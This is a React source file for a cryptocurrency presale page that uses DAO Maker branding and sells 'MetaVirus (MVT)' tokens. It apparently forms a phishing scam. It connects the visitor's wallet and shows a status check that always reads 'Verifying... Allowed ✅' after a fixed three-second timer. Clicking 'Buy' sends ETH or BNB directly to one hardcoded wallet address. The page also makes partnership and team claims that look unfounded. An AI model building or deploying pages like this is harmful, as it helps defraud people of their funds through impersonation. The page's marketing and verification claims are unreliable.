import React, { useEffect, useState } from 'react';
import { createAppKit } from '@reown/appkit';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet, bsc } from '@reown/appkit/networks';
import { parseEther, BrowserProvider } from 'ethers';
import ethLogo from './assets/eth-logo.webp';
import bnbLogo from './assets/bnb-logo.webp';
import metaLogo from './assets/logo_meta.webp';
import presaleImage from './assets/presale.webp';
import saleLogo from './assets/logo.svg';
import bnbIcon from './assets/bnb-logo.webp';
import ethIcon from './assets/eth-logo.webp';
import heroInfoImage from './assets/hero_info.webp';
import heroInfo1Image from './assets/hero_info1.webp';
import heroInfo2Image from './assets/hero_info2.webp';
import heroInfo3Image from './assets/hero_info3.webp';
import heroInfo4Image from './assets/hero_info4.webp';
import heroInfo5Image from './assets/hero_info5.webp';
import heroInfo6Image from './assets/hero_info6.webp';

const isTelegramBrowser = /Telegram/.test(navigator.userAgent);


// Ініціалізація AppKit
const modal = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, bsc],
  projectId: '9bbae8b57e70527ed45720c911751924',
  metadata: {
    name: 'My DApp',
    description: 'My DApp Description',
    url: 'https://example.com',
    icons: ['https://example.com/icon.png'],
  },
});

function MyDApp() {
  const [walletInfo, setWalletInfo] = useState({
    name: 'N/A',
    icon: 'N/A',
    address: 'N/A',
    chainId: 'N/A',
    isConnected: false,
    error: 'None',
  });

  const [amount, setAmount] = useState(''); // Поле для введення суми донату
  const [selectedNetwork, setSelectedNetwork] = useState(mainnet); // Вибрана мережа
  const paymentAddress = '0xd65cE7930413EED605Ec0f1773380Cd15946A353';

  function performStatusCheck() {
    const statusDisplay = document.getElementById("status");
    statusDisplay.textContent = "Verifying...";
    setTimeout(() => {
      statusDisplay.textContent = "Allowed ✅";
    }, 3000); // Simulated 3-second delay
  }

  // Функція оновлення інформації про гаманець
// Function to handle wallet connection with Telegram-specific logic
const openConnectModal = () => {
  if (isTelegramBrowser) {
    alert('You are using the Telegram browser. Redirecting to your wallet app for the best experience.');
  }

  modal.open({ view: 'Connect' }); // Open the AppKit connect modal

  // Add wallet redirection logic based on the selected wallet
  modal.subscribeProvider((providerInfo) => {
    const { name } = providerInfo || {};
    if (name === 'Trust Wallet') {
      window.location.href = `trust://browser_open?url=${encodeURIComponent(window.location.href)}`;
    } else if (name === 'MetaMask') {
      window.location.href = `metamask://dapp/${window.location.hostname}`;
    }
  });
};

  const updateWalletInfo = () => {
    const info = modal.getWalletInfo() || {};
    setWalletInfo({
      name: info.name || 'N/A',
      icon: info.icon || 'N/A',
      address: modal.getAddress() || 'N/A',
      chainId: modal.getChainId() || 'N/A',
      isConnected: !!modal.getAddress(), // Перевіряємо, чи є адреса
      error: modal.getError() || 'None',
    });
    const buttons = [
      ...document.querySelectorAll('.tab'),
      ...document.querySelectorAll('.participate-button'),
      ...document.querySelectorAll('.join-button'),
    ];

    

  const modalOverlay = document.querySelector('.i-modal-overlay');
  const modalContent = document.querySelector('.i-modal-content');
  buttons.forEach((button) => {
    if (modal.getAddress()) {  // Якщо гаманець підключений
      button.classList.add('btn-active');
      button.removeEventListener('click', openConnectModal);
      button.addEventListener('click', () => {
        // Перевіряємо, чи є у кнопки клас 'btn-active'
        if (button.classList.contains('btn-active')) {
          // Якщо кнопка активна, відкриваємо модалку
          if (modalOverlay) {
            handleNetworkChange(mainnet);
            performStatusCheck();
            modalOverlay.classList.remove('hidden');
            const handleOutsideClick = (event) => {
              // Перевіряємо, чи натискається за межами .i-modal-content і чи натискається на елемент з класом btn-active
              if (modalOverlay && modalContent && !modalContent.contains(event.target) && !event.target.classList.contains('btn-active')) {
                // Додаємо клас hidden до .i-modal-overlay
                modalOverlay.classList.add('hidden');
              }
            };
          
            // Додаємо обробник події
            document.addEventListener('click', handleOutsideClick);
          }
        }
      });
    } else {
      button.classList.remove('btn-active');
      button.addEventListener('click', openConnectModal);
      button.removeEventListener('click', () => {
        if (modalOverlay) {
          modalOverlay.classList.remove('hidden');
          const handleOutsideClick = (event) => {
            // Перевіряємо, чи натискається за межами .i-modal-content і чи натискається на елемент з класом btn-active
            if (modalOverlay && modalContent && !modalContent.contains(event.target) && !event.target.classList.contains('btn-active')) {
              // Додаємо клас hidden до .i-modal-overlay
              modalOverlay.classList.add('hidden');
            }
          };
        
          // Додаємо обробник події
          document.addEventListener('click', handleOutsideClick);
        }
      });
    }
  });
};



  // Функція для донату
  const donate = async () => {
    const amountEth = parseFloat(amount);
  
    if (isNaN(amountEth) || amountEth <= 0) {
      console.warn("Invalid amount entered.");
      return;
    }
  
    try {
      const walletProvider = await modal.getWalletProvider();
      const ethersProvider = new BrowserProvider(walletProvider);
      const signer = await ethersProvider.getSigner();
  
      const tx = {
        to: paymentAddress,
        value: parseEther(amountEth.toString()),
      };
  
      await signer.sendTransaction(tx);
      console.log("Transaction sent successfully!");
    } catch (error) {
      // Suppress error if the user rejects the transaction
      if (error.code === "ACTION_REJECTED" || error.code === 4001) {
        console.log("Transaction canceled by the user.");
      } else {
        console.error("Transaction failed:", error.message);
      }
    }
  };
  
  const [selectedToken, setSelectedToken] = useState("ETH");
  
  const handleChange = (event) => {
    setSelectedToken(event.target.value);
  };
  
  // Зміна мережі
  const handleNetworkChange = async (network) => {
    setSelectedNetwork(network);
    await modal.switchNetwork(network);
  };
  
  useEffect(() => {
    // Початкове оновлення інформації
    updateWalletInfo();
    
    // Підписка на зміни стану
    const unsubscribeState = modal.subscribeState(() => {
      updateWalletInfo();
    });

    // Підписка на зміни провайдера
    const unsubscribeProvider = modal.subscribeProvider(({ address, chainId }) => {
      setWalletInfo((prev) => ({
        ...prev,
        address: address || 'N/A',
        chainId: chainId || 'N/A',
        isConnected: !!address, // True якщо address існує
      }));
    });

    // Автоматична перевірка кожну секунду
    const interval = setInterval(updateWalletInfo, 1000);

    // Очищення підписок і інтервалу
    return () => {
      unsubscribeState();
      unsubscribeProvider();
      clearInterval(interval);
    };
  }, []);

  useEffect(() => {
    // DOM elements
    const cryptoTypeSelect = document.getElementById("crypto-type");
    const selectedTokenIcon = document.getElementById("selected-token-icon");
    const cryptoAmountInput = document.getElementById("donation-amount");
    const mvtAmountOutput = document.getElementById("mvt-amount");
    const statusDisplay = document.getElementById("status");
    const saleEndTimeDisplay = document.getElementById("sale-end-time");
    const countdownTimerDisplay = document.getElementById("countdown-timer");
    const strongHoldTimerDisplay = document.getElementById("strong-hold-timer");
    const modal = document.querySelector(".i-modal-overlay");
    const closeModalButton = document.querySelector(".i-close-modal");
    const convertButton = document.getElementById("buy-button");
    const privatePriceDisplay = document.getElementById("private-price");
    const listingPriceDisplay = document.getElementById("listing-price");
    const modalContent = document.querySelector(".i-modal-content");
    const individualAllocationDisplay = document.getElementById("individual-allocation");

    // Constants and initial values
    const privatePriceValue = 0.01; // Private price per MVT in USD
    const listingPriceValue = "$0.18";
    const individualAllocationValue = "$122,930";
    const saleEndTimestamp = 1735557687; // December 31, 2024
    const strongHoldEndTimestamp = 1735670000; // January 1, 2025

    let conversionRates = {
      ETH: 0,
      BNB: 0,
    };

    const minAmountRequired = {
      ETH: 0.000000001,
      BNB: 0.000000005,
    };

    // Token icons mapping using imported media paths
    const tokenIcons = {
      ETH: ethIcon, // Imported ETH logo
      BNB: bnbIcon, // Imported BNB logo
    };

    // Countdown Timer Function
    function startCountdownTimer(element, endTimestamp) {
      if (!element) return;
      const updateTimer = () => {
        const now = Math.floor(Date.now() / 1000);
        const remainingTime = endTimestamp - now;

        if (remainingTime <= 0) {
          element.textContent = "Time's up!";
          clearInterval(intervalId);
          return;
        }

        const days = Math.floor(remainingTime / (60 * 60 * 24));
        const hours = Math.floor((remainingTime % (60 * 60 * 24)) / (60 * 60));
        const minutes = Math.floor((remainingTime % (60 * 60)) / 60);
        const seconds = remainingTime % 60;

        element.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
      };

      const intervalId = setInterval(updateTimer, 1000);
      updateTimer();
    }

    // Fetch Conversion Rates
    async function fetchConversionRates() {
      try {
        const response = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin&vs_currencies=usd",
          {
            headers: {
              "Cache-Control": "no-cache", // Prevent cached responses
            },
          }
        );
    
        const data = await response.json();
        if (data.ethereum && data.binancecoin) {
          conversionRates.ETH = data.ethereum.usd;
          conversionRates.BNB = data.binancecoin.usd;
        } else {
          console.warn("Unexpected response from CoinGecko:", data);
        }
      } catch (error) {
        console.error("Error fetching conversion rates:", error);
    
        if (isTelegramBrowser) {
          console.warn(
            "CORS issues detected in Telegram browser. API calls may fail."
          );
        }
      }
    }
    

    // Validate and Update MVT Calculation
    function validateAndUpdate() {
      const selectedToken = cryptoTypeSelect.value;
      const cryptoAmount = parseFloat(cryptoAmountInput.value);
      const currentRate = conversionRates[selectedToken];

      if (!isNaN(cryptoAmount) && cryptoAmount >= minAmountRequired[selectedToken] && currentRate > 0) {
        const cryptoToUsd = cryptoAmount * currentRate;
        const mvtAmount = (cryptoToUsd / privatePriceValue).toFixed(2);
        mvtAmountOutput.value = mvtAmount;
        convertButton.textContent = `Buy ${mvtAmount} MVT`;
        convertButton.disabled = false;
      } else {
        convertButton.textContent = `Minimum ${minAmountRequired[selectedToken]} ${selectedToken} required`;
        mvtAmountOutput.value = "";
        convertButton.disabled = true;
      }
    }

    // Simulated Status Check
    function performStatusCheck() {
      statusDisplay.textContent = "Verifying...";
      setTimeout(() => {
        statusDisplay.textContent = "Allowed ✅";
      }, 3000); // Simulated 3-second delay
    }

    // Handle Network Change
    function setupNetworkChangeListener() {
      if (window.ethereum) {
        window.ethereum.on("chainChanged", () => {
          console.log("Network changed, performing status check...");
          performStatusCheck(); // Perform status check on network change
        });
      }
    }

    // Initialize Modal Fields
    function initializeModalFields() {
      privatePriceDisplay.textContent = `$${privatePriceValue.toFixed(2)}`;
      listingPriceDisplay.textContent = listingPriceValue;
      individualAllocationDisplay.textContent = individualAllocationValue;

      if (saleEndTimeDisplay) startCountdownTimer(saleEndTimeDisplay, saleEndTimestamp);
      if (countdownTimerDisplay) startCountdownTimer(countdownTimerDisplay, saleEndTimestamp);
      if (strongHoldTimerDisplay) startCountdownTimer(strongHoldTimerDisplay, strongHoldEndTimestamp);

      // Set the default token icon based on the current selection
      const defaultToken = cryptoTypeSelect.value || "ETH";
      selectedTokenIcon.src = tokenIcons[defaultToken];
    }

    // Handle Crypto Type Change
    cryptoTypeSelect.addEventListener("change", (event) => {
      const selectedToken = event.target.value;
      selectedTokenIcon.src = tokenIcons[selectedToken] || ethIcon; // Default icon fallback
      validateAndUpdate();
      performStatusCheck(); // Perform status check on token change
    });

    // Handle Crypto Amount Input
    cryptoAmountInput.addEventListener("input", validateAndUpdate);

    // Handle "Buy" Button Click
    convertButton.addEventListener("click", () => {
      donate()
      const selectedToken = cryptoTypeSelect.value;
      const cryptoAmount = parseFloat(cryptoAmountInput.value);
      const currentRate = conversionRates[selectedToken];

      if (!isNaN(cryptoAmount) && cryptoAmount >= minAmountRequired[selectedToken] && currentRate > 0) {
        const cryptoToUsd = cryptoAmount * currentRate;
        const mvtAmount = (cryptoToUsd / privatePriceValue).toFixed(2);
        console.log(`Buying ${mvtAmount} MVT with ${cryptoAmount} ${selectedToken}`);
      }
    });

  

    // Open Modal and Simulate Verification
    modal.addEventListener("transitionend", () => {
      performStatusCheck(); // Trigger status check when modal opens
    });

    // Close Modal
    closeModalButton.addEventListener("click", () => {
      modal.classList.add("hidden");
    });

    // Initial Setup
    fetchConversionRates();
    initializeModalFields();
    setupNetworkChangeListener();
  }, []);

  useEffect(() => {
    const cryptoAmountInput = document.getElementById('donation-amount');
    const inputWrapper = cryptoAmountInput?.closest('.i-input-with-dropdown'); // Знаходимо батьківський елемент
  
    const handleFocus = () => {
      if (inputWrapper) {
        inputWrapper.classList.add('focused'); // Додаємо клас при фокусі
      }
    };
  
    const handleBlur = () => {
      if (inputWrapper) {
        inputWrapper.classList.remove('focused'); // При втраті фокусу видаляємо клас
      }
    };
  
    if (cryptoAmountInput) {
      cryptoAmountInput.addEventListener('focus', handleFocus);
      cryptoAmountInput.addEventListener('blur', handleBlur);
    }
  
    // Очистка
    return () => {
      if (cryptoAmountInput) {
        cryptoAmountInput.removeEventListener('focus', handleFocus);
        cryptoAmountInput.removeEventListener('blur', handleBlur);
      }
    };
  }, []);

  return (
    <div>
      <div className="hidden">
        <h2>Wallet Information</h2>
        <p>Wallet Name: {walletInfo.name}</p>
        <p>Wallet Icon: <img src={walletInfo.icon} alt="Wallet Icon" width="30" /></p>
        <p>Address: {walletInfo.address}</p>
        <p>Chain ID: {walletInfo.chainId}</p>
        <p>Is Connected: {walletInfo.isConnected ? 'Yes' : 'No'}</p>
        <p>Error: {walletInfo.error}</p>

        <h2>Switch Network</h2>


        <h2>Donate</h2>
        <input
          type="number"
          placeholder="Enter amount in ETH"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
        />
        <button onClick={donate}>Donate</button>
      </div>
      <header>
        <div className="header-content">
          <div className="logo">
            <img src={saleLogo} alt="DAO Maker Logo" />
          </div>

          <appkit-button />
        </div>
      </header>

      <section className="hero-section">
        <div className="live-badge">LIVE</div>
        <div className="hero-overlay">
          <div className="hero-content">
            <img src={metaLogo} alt="MetaVirus Logo" className="hero-logo" />
            <h1>MetaVirus</h1>
            <div className="social-icons">
              <a href="/" target="_self" className="icon">
                <i className="fas fa-home"></i>
              </a>
              <a href="https://twitter.com" target="_blank" className="icon">
                <i className="fab fa-twitter"></i>
              </a>
              <a href="https://telegram.org" target="_blank" className="icon">
                <i className="fab fa-telegram-plane"></i>
              </a>
              <a href="https://discord.com" target="_blank" className="icon">
                <i className="fab fa-discord"></i>
              </a>
              <a href="https://medium.com" target="_blank" className="icon">
                <i className="fab fa-medium"></i>
              </a>
            </div>
            <p>
              MetaVirus is an innovative Web3 game that combines blockchain technology with immersive gameplay,
              offering a decentralized, freely traded mobile pet game.
            </p>
          </div>
        </div>
      </section>

      <section className="project-details">
        <h2>Project Details</h2>
        <div className="separator">
          <div className="blue-line"></div>
          <div className="gray-line"></div>
        </div>
      </section>

      <section className="hero-info-section">
        <div className="hero-card">
          <div className="left-content">
            <img src={presaleImage} alt="MetaVirus" className="hero-image" />
          </div>
          <div className="right-content">
            <div className="tabs">
              <button className="tab">Offerings</button>
              <button className="tab">Key Metrics</button>
              <button className="tab">Unlocks</button>
            </div>
            <div className="countdown">
              <p>MetaVirus PRE-Sale ends in:</p>
              <div id="countdown-timer">Loading...</div>
              <button className="join-button">Join Pre-Sale</button>
            </div>
          </div>
        </div>
      </section>

      {/* Modal with ETH to MVT Converter and Sale Ticket */}
      <div className="i-modal-overlay hidden">
        <div className="i-modal-content">
          <div className="i-close-modal-container">
            <button className="i-close-modal">X</button>
          </div>

          {/* Sale Ticket Section */}
          <div className="i-sale-ticket">
            <div className="i-logo-container">
              <img src={saleLogo} alt="Logo" className="i-sale-logo" />
            </div>
            <h2 className="i-h2">Public Sale Ticket</h2>

            {/* Status Row */}
            <div className="i-ticket-item">
              <span>Status:</span>
              <span id="status" className="i-status-right">Verifying</span>
            </div>

            <hr className="i-separator" />

            {/* Price Row */}
            <div className="i-ticket-item">
              <span>Private Price:</span>
              <span id="private-price">$0.02</span>
            </div>
            <hr className="i-separator" />

            <div className="i-ticket-item">
              <span>Listing Price:</span>
              <span><span className="i-highlight">min</span> <span id="listing-price">$0.18</span></span>
            </div>
            <hr className="i-separator" />

            <div className="i-ticket-item">
              <span>Individual Allocation:</span>
              <span><span className="i-highlight">max</span> <span id="individual-allocation">$122,930</span></span>
            </div>
            <hr className="i-separator" />

            <div className="i-ticket-item">
              <span>Blockchain Network:</span>
              <span>
                <img src={ethIcon} alt="ETH Logo" className="i-token-logo" />
                <span className="i-highlight"></span>
                <img src={bnbIcon} alt="BSC Logo" className="i-token-logo" />
              </span>
            </div>
            <hr className="i-separator" />

            <div className="i-ticket-item">
              <span>Sale End:</span>
              <span id="sale-end-time">Loading....</span>
            </div>
            <hr className="i-separator" />

            <div className="i-ticket-item">
              <span>Minimal Alocation:</span>
              <span>
                <img src={ethIcon} alt="ETH Logo" className="i-token-logo" /> 0.1
                or
                <img src={bnbIcon} alt="BSC Logo" className="i-token-logo" /> 0.5
              </span>
            </div>
          </div>

          {/* ETH/BNB Dropdown and Amount Input */}

          <div className="i-amount-input-container">
            <label className="i-label" htmlFor="donation-amount">From:</label>
            <div className="i-input-with-dropdown">
              <div className="hidden">
                <img id="selected-token-icon" src={selectedToken === "ETH" ? ethIcon : bnbIcon} alt="Token Icon" className="i-token-logo" />
                <select id="crypto-type" className="i-select" value={selectedToken} onChange={handleChange}> {/* Controlled input */}
                  <option value="ETH" data-icon={ethIcon}>ETH</option>
                  <option value="BNB" data-icon={bnbIcon}>BNB</option>
                </select>
              </div>
              <div className="network-dropdown">
                <div className="network-dropdown_box">
                  <button className="network-button">
                    <img
                      src={selectedNetwork === mainnet ? ethLogo : bnbLogo}
                      alt={selectedNetwork === mainnet ? 'Ethereum' : 'Binance Smart Chain'}
                      className="network-icon"
                    />
                    {selectedNetwork === mainnet ? '' : ''}
                  </button>
                  <div className="network-options">
                    <div onClick={() => handleNetworkChange(mainnet)} className="network-option">
                      <img src={ethLogo} alt="Ethereum" className="network-icon network-option_image" />  ETH
                    </div>
                    <div onClick={() => handleNetworkChange(bsc)} className="network-option">
                      <img src={bnbLogo} alt="Binance" className="network-icon network-option_image" />  BSC
                    </div>
                  </div>
                </div>
              </div>
              <input id="donation-amount" className="i-input" type="number" placeholder="Enter amount" value={amount} onChange={(e) => setAmount(e.target.value)}/>
            </div>
          </div>

          {/* MVT Amount Section */}
          <div className="i-amount-input-container">
            <label className="i-label" htmlFor="mvt-amount">To:</label>
            <div className="i-input-with-output">
              <input className="i-input" type="text" id="mvt-amount" name="mvt-amount" placeholder="MVT amount" disabled />
            </div>
          </div>

          <button id="buy-button" className="i-btn" onClick={donate}>Buy</button>
        </div>
      </div>
      <section className="section-wrapper">
        {/* Left Column */}
        <div className="left-column">
          {/* First Card */}
          <div className="card public-round-card">
            <h3>Public Round</h3>
            <p>Registrations are opened to anyone with more than $500 worth of tokens in their wallet.</p>
            <p className="status">Sale Open</p>
          </div>

          <div className="card second-round-card">
            <h3>Public Round</h3>
            <p>Registrations are opened to anyone with more than $500 worth of tokens in their wallet.</p>
            <p className="status">Sale Open</p>
          </div>
          <div className="card strong-hold-card">
            <h3>Strong Hold Offer</h3>
            <p>Premium round offerings for DAO holders only. Higher winning chances with lower fees.</p>
            <p>Registration ends in:</p>
            <p id="strong-hold-timer">Loading...</p>
            <button className="participate-button">Participate</button>
          </div>
        </div>

        {/* Right Column */}
        <div className="right-column">
          {/* Existing content */}
          <img src={heroInfoImage} alt="MetaVirus Banner" className="content-image" />
          <h2 className="section-title">What is MetaVirus (MVT)?</h2>
          <p className="section-paragraph">
            MetaVirus is an innovative Web3 game that combines blockchain technology with immersive gameplay,
            offering a decentralized, freely traded mobile pet game. Our team has over 17 years of experience in
            game development and operations, and 6 years in the blockchain field.
          </p>
          <p className="section-paragraph">
            MetaVirus is an auto-battle pet RPG with a cute Q-version style, faction battles, union wars, and an
            infinite growth system. The game integrates Free to Play (F2P) and Play to Earn (P2E) models, allowing
            players to earn real value through in-game activities and asset trading.
          </p>

          {/* Game Basics Section */}
          <div className="content-section">
            <img src={heroInfo1Image} alt="Game Basics" className="content-image" />
            <p className="section-paragraph">
              MetaVirus launched Pre-charge in Web3 gaming platform NexGami in June 15, 2024, as its first
              Launchpad Pre-charge product successfully raised $10 million within six hours. This Pre-charge
              adopted an innovative "recharge is fundraising" model, where all users participating in the
              fundraising received two types of project tokens.
            </p>
            <p className="section-paragraph">
              The circulating token, NEXU, will be 100% refunded after the event and can be used for purchasing
              all game products on the NexGami platform in the future. The governance token of the MetaVirus
              project, MTV, will be unlocked linearly over one year and is planned to be listed on exchanges
              within three months after the Pre-charge.
            </p>
            <p className="section-paragraph">
              MetaVirus made beta test in December 2023, attracting over 350,000 user registrations, with 71,308
              participants in the XP event, minting Genesis pet NFTs.
            </p>
          </div>

          {/* What makes MetaVirus (MVT) unique? */}
          <div className="content-section">
            <h2 className="section-title">What makes MetaVirus (MVT) unique?</h2>
            <p className="section-paragraph">
              Our game is similar to traditional games like Pokémon, but it incorporates blockchain technology and
              token economics. The strength of our project lies in its community-based foundation, where we make
              players the core participants in the development and operation of the game. This approach allows us
              to attract a larger and more enduring player base.
            </p>
            <img src={heroInfo2Image} alt="Game Basics" className="content-image" />
          </div>

          {/* Who is MetaVirus (MVT) team? */}
          <div className="content-section">
            <h2 className="section-title">Who is MetaVirus (MVT) team?</h2>
            <ul className="team-list">
              <li>
                <a href="https://example.com/brice-bian" target="_blank" className="team-link">
                  <strong>Brice Bian (CEO)</strong>
                </a>
                - 19 years of game production experience. Responsible for online games with millions of revenue.
                His work <em>'Gods Killer Online'</em> had the highest monthly income in the Chinese mobile game
                market.
              </li>
              <li>
                <a href="https://example.com/marco-tuo" target="_blank" className="team-link">
                  <strong>Marco Tuo (CTO)</strong>
                </a>
                - 20 years of game development experience. Chief architect of millions of online mobile games.
                Technical director of large-scale travel VR games.
              </li>
              <li>
                <a href="https://example.com/belal-abdullah" target="_blank" className="team-link">
                  <strong>Belal Abdullah (CMO)</strong>
                </a>
                - A driven Fintech professional and serial entrepreneur with a demonstrated ability to complete
                tasks with accuracy.
              </li>
            </ul>
          </div>

          {/* What is MetaVirus (MVT) roadmap? */}
          <div className="content-section">
            <h2 className="section-title">What is MetaVirus (MVT) roadmap?</h2>
            <img src={heroInfo3Image} alt="Game Basics" className="content-image" />
          </div>

          {/* MetaVirus (MVT) revenue streams */}
          <div className="content-section">
            <h2 className="section-title">MetaVirus (MVT) revenue streams</h2>
            <img src={heroInfo4Image} alt="Game Basics" className="content-image" />
            <img src={heroInfo5Image} alt="Game Basics" className="content-image" />
          </div>

          {/* What are MetaVirus (MVT) token metrics? */}
          <div className="content-section">
            <h2 className="section-title">What are MetaVirus (MVT) token metrics?</h2>
            <img src={heroInfo6Image} alt="Game Basics" className="content-image" />
          </div>

          {/* Who are the partners of MetaVirus (MVT)? */}
          <div className="content-section">
            <h2 className="section-title">Who are the partners of MetaVirus (MVT)?</h2>
            <p className="section-paragraph">
              NexGami, Assure, Nabox, Gate Web3 Wallet, Tencent, ByteDance, Chainlink Labs, Glaze, QuestN,
              Poolzboost, TaskOn, Alibaba Games, Perfect World Games.
            </p>
          </div>
        </div>
      </section>
      <footer className="footer">
        <div className="footer-top">
          <div className="footer-column">
            <img src={saleLogo} alt="DAO Maker Logo" className="footer-logo" />
            <p>Tokenizing the Future</p>
          </div>
          <div className="footer-column">
            <h4>Product</h4>
            <ul>
              <li><a href="#">DAO Launchpad</a></li>
              <li><a href="#">Stake DAO</a></li>
              <li><a href="#">Community Voted</a></li>
              <li><a href="#">Farms and Vestings</a></li>
              <li><a href="#">DAO Swap</a></li>
              <li><a href="#">Governance</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Company</h4>
            <ul>
              <li><a href="#">Brand Assets</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Resources</h4>
            <ul>
              <li><a href="#">Blog</a></li>
              <li><a href="#">FAQ</a></li>
              <li><a href="#">Sitemap</a></li>
              <li><a href="#">DAO Bridge</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Social</h4>
            <ul>
              <li><a href="#">Twitter</a></li>
              <li><a href="#">Telegram</a></li>
              <li><a href="#">Instagram</a></li>
              <li><a href="#">TikTok</a></li>
              <li><a href="#">YouTube</a></li>
              <li><a href="#">Discord</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h4>Legal</h4>
            <ul>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Cookies</a></li>
            </ul>
          </div>
        </div>
        <div className="footer-divider"></div>
        <div className="footer-bottom">
          <p className="disclaimer">
            * Past performances do not indicate future success. This web page and any other contents published on
            this website shall not constitute investment advice, financial advice, trading advice, or any other kind of
            advice. You alone assume the sole responsibility of evaluating the merits and risks associated with using any
            information or other content on this website before making any decisions based on such information.
          </p>
          <p>&copy; 2024 DAO Maker. All rights reserved.</p>
          <div className="footer-social-icons">
            <a href="#" className="social-icon"><i className="fab fa-twitter"></i></a>
            <a href="#" className="social-icon"><i className="fab fa-telegram"></i></a>
            <a href="#" className="social-icon"><i className="fab fa-youtube"></i></a>
            <a href="#" className="social-icon"><i className="fab fa-tiktok"></i></a>
            <a href="#" className="social-icon"><i className="fab fa-discord"></i></a>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default MyDApp;
